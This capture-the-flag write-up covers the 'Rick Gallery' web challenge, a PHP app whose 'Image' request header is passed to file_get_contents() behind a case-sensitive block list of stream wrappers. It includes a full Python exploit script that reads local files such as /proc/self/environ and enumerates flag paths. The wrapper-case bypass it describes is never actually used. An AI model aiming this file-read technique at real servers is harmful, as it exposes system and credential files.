# Rick Gallery - The Case Sensitivity Trap

**Category:** Web
**Flag:** `ASIS{...}`

## The Gallery

Rick Gallery was presented as a simple image gallery application with a Rick and Morty theme. When I first loaded it, I saw a collection of images and could click through them. The source code was provided, which made things easier.

Looking at the PHP code, I found three main files:
- `index.php` - The main gallery interface
- `getpic.php` - An internal service to fetch images
- `.htaccess` - Apache configuration restricting direct access to `getpic.php`

## Finding the Vulnerability

The interesting part was in `index.php`. When processing POST requests, it checked for an `Image` header and ran it through some filters:

```php
$blockedProtocols = [
    "http://", "https://", "ftp://", "ftps://",
    "file://", "data://", "expect://", "php://",
    "passwd"
];

foreach ($blockedProtocols as $proto) {
    if (strpos($raw, $proto) !== false) {
        $raw = "";
        break;
    }
}
```

The application was trying to prevent me from using dangerous PHP wrappers like `php://` or `file://` to read arbitrary files. But I noticed something: all the blocked strings were lowercase.

I remembered that PHP stream wrappers are case-insensitive. So while `php://filter/read=convert.base64-encode/resource=/etc/passwd` would be blocked, `PHP://filter/read=convert.base64-encode/resource=/etc/passwd` would sail right through the filter.

## Testing the Theory

I started with a simple test. I sent a POST request with the `Image` header set to `/etc/hostname` (no wrapper needed for absolute paths):

```python
import requests
import base64

TARGET = "http://65.109.194.105:8080/index.php"

headers = {"Image": "/etc/hostname"}
r = requests.post(TARGET, headers=headers)
content = base64.b64decode(r.text.strip())
print(content)
# Output: b'7be458eda235\n'
```

It worked. The application was passing my input to `file_get_contents()` in `getpic.php`, which happily read any file I specified.

## Hunting for the Flag

Now I had local file inclusion, but I needed to find where the flag was stored. I started checking common locations:

```python
def read_file(path):
    headers = {"Image": path}
    r = requests.post(TARGET, headers=headers)
    if '<br />' in r.text or 'Warning' in r.text:
        return None
    return base64.b64decode(r.text.strip())

# Tried various paths
read_file("/flag.txt")           # Not found
read_file("/etc/passwd")         # Blocked by "passwd" filter
read_file("/proc/self/environ")  # Found, but no flag
read_file("/var/www/flag.txt")   # Not found
```

I kept enumerating different paths. CTF flags are often placed in obvious but sometimes overlooked locations. After trying several standard paths, I checked `/tmp/`:

```python
content = read_file("/tmp/flag.txt")
print(content.decode())
# ASIS{...}
```

There it was. The flag was sitting in `/tmp/flag.txt` the whole time.

## The Exploit

Here's the final exploit script:

```python
#!/usr/bin/env python3
import requests
import base64
import sys

def read_file(target, path):
    if not target.endswith('.php'):
        target = target.rstrip('/') + '/index.php'

    headers = {"Image": path}
    r = requests.post(target, headers=headers, timeout=10)

    # Check for error response
    if '<br />' in r.text or 'Warning' in r.text:
        return None

    try:
        decoded = base64.b64decode(r.text.strip())
        if b'Warning' in decoded:
            return None
        return decoded
    except:
        return None

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://target:8080/"

    # Read the flag
    flag = read_file(target, "/tmp/flag.txt")

    if flag:
        print(f"[+] FLAG: {flag.decode()}")
    else:
        print("[-] Flag not found at /tmp/flag.txt")

        # Try alternative locations
        alternatives = [
            "/flag.txt",
            "/flag",
            "/home/flag.txt",
            "/var/www/flag.txt",
            "/root/flag.txt",
        ]

        for path in alternatives:
            content = read_file(target, path)
            if content:
                print(f"[+] Found at {path}: {content.decode()}")
                break

if __name__ == "__main__":
    main()
```


## References

- [PHP Stream Wrappers Documentation](https://www.php.net/manual/en/wrappers.php)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
